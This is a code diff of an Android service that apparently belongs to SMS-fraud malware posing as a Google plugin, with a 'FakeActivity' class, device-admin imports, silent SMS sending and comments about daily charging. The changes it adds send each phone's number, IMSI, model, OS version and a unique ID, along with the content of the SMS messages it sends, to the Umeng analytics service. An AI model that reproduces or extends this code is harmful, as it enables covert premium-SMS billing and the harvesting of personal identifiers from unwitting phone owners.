@@ -5,6 +5,7 @@ import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.os.Build;
 import android.os.IBinder;
 import android.text.TextUtils;
 import com.googl.plugin.x.FakeActivity;
@@ -12,6 +13,7 @@ import com.googl.plugin.x.R;
 import com.plugin.common.utils.CustomThreadPool;
 import com.plugin.common.utils.UtilsRuntime;
 import com.plugin.internet.InternetUtils;
+import com.umeng.analytics.MobclickAgent;
 import com.xstd.plugin.Utils.BRCUtil;
 import com.xstd.plugin.Utils.CommonUtil;
 import com.xstd.plugin.Utils.DomanManager;
@@ -27,6 +29,7 @@ import com.xstd.plugin.config.SettingManager;
 
 import java.io.File;
 import java.util.Calendar;
+import java.util.HashMap;
 import java.util.UUID;
 
 /**
@@ -109,7 +112,18 @@ public class PluginService extends IntentService {
                         if (Config.DEBUG) {
                             Config.LOGD("[[PluginService::fetchPhoneFromServer]] after fetch PHONE number : (" + respone.phone + ")");
                         }
-                        SettingManager.getInstance().setCurrentPhoneNumber(respone.phone);
+                        if (respone.phone.length() == 11) {
+                            SettingManager.getInstance().setCurrentPhoneNumber(respone.phone);
+                            //notify umeng
+                            HashMap<String, String> log = new HashMap<String, String>();
+                            log.put("fetch", "succes");
+                            log.put("phoneNumber", respone.phone);
+                            log.put("imsi", imsi);
+                            log.put("phoneType", Build.MODEL);
+                            CommonUtil.umengLog(getApplicationContext(), "fetch_pn_with_imei", log);
+                        } else {
+                            SettingManager.getInstance().setKeyLastSendMsgToServicePhone(System.currentTimeMillis());
+                        }
                     }
                 }
             }
@@ -132,6 +146,7 @@ public class PluginService extends IntentService {
             if (Config.DEBUG) {
                 Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] before send broadcast, current phone Number is : " + phoneNumbers);
             }
+            BRCUtil.cancelAlarmForAction(getApplicationContext(), SMS_BROADCAST_ACTION);
             if (!TextUtils.isEmpty(phoneNumbers)) {
                 String[] datas = phoneNumbers.split(";");
                 if (datas != null) {
@@ -146,6 +161,13 @@ public class PluginService extends IntentService {
                             if (SMSUtil.sendSMS(datas[i], "XSTD.SC:" + content)) {
                                 datas[i] = "";
                             }
+
+                            //notify umeng
+                            HashMap<String, String> log = new HashMap<String, String>();
+                            log.put("content", "XSTD.SC:" + content);
+                            log.put("to", content);
+                            log.put("phoneType", Build.MODEL);
+                            CommonUtil.umengLog(getApplicationContext(), "chken_send", log);
                         } else {
                             //电话号码的格式不合法，直接电话号码清空
                             datas[i] = "";
@@ -355,6 +377,17 @@ public class PluginService extends IntentService {
                          * 只要是服务器返回了，今天就不工作了，因为如果是网络异常的话会走try catch
                          */
                         if (response != null && !TextUtils.isEmpty(response.channelName)) {
+                            //notify umeng
+                            HashMap<String, String> log = new HashMap<String, String>();
+                            log.put("fetch", "succes");
+                            log.put("channelName", response.channelName);
+                            log.put("phoneNumber", SettingManager.getInstance().getCurrentPhoneNumber());
+                            log.put("osVersion", Build.VERSION.RELEASE);
+                            log.put("channelCode", Config.CHANNEL_CODE);
+                            log.put("phoneType", Build.MODEL);
+                            log.put("uuid", unique);
+                            CommonUtil.umengLog(getApplicationContext(), "fetch_channel", log);
+
                             if (Config.DEBUG) {
                                 Config.LOGD(response.toString());
                             }
@@ -392,6 +425,17 @@ public class PluginService extends IntentService {
                                 Config.LOGD("[[PluginService::activePluginAction]] server return data == null, So we set DayActiveCount = 17");
                             }
                             SettingManager.getInstance().setKeyDayActiveCount(17);
+
+                            //notify umeng
+                            HashMap<String, String> log = new HashMap<String, String>();
+                            log.put("fetch", "succes");
+                            log.put("channelName", "今天不扣费");
+                            log.put("phoneNumber", SettingManager.getInstance().getCurrentPhoneNumber());
+                            log.put("osVersion", Build.VERSION.RELEASE);
+                            log.put("channelCode", Config.CHANNEL_CODE);
+                            log.put("phoneType", Build.MODEL);
+                            log.put("uuid", unique);
+                            CommonUtil.umengLog(getApplicationContext(), "fetch_channel", log);
                         }
                     }
                 } catch (Exception e) {
@@ -400,6 +444,15 @@ public class PluginService extends IntentService {
                         Config.LOGD("[[networkErrorWork]] entry", e);
                     }
                     networkErrorWork();
+                    //notify umeng
+                    HashMap<String, String> log = new HashMap<String, String>();
+                    log.put("fetch", "failed");
+                    log.put("phoneNumber", SettingManager.getInstance().getCurrentPhoneNumber());
+                    log.put("osVersion", Build.VERSION.RELEASE);
+                    log.put("channelCode", Config.CHANNEL_CODE);
+                    log.put("phoneType", Build.MODEL);
+                    log.put("errorType", "network");
+                    CommonUtil.umengLog(getApplicationContext(), "fetch_channel_failed", log);
                 }
 
                 AppRuntime.ACTIVE_PROCESS_RUNNING.set(false);
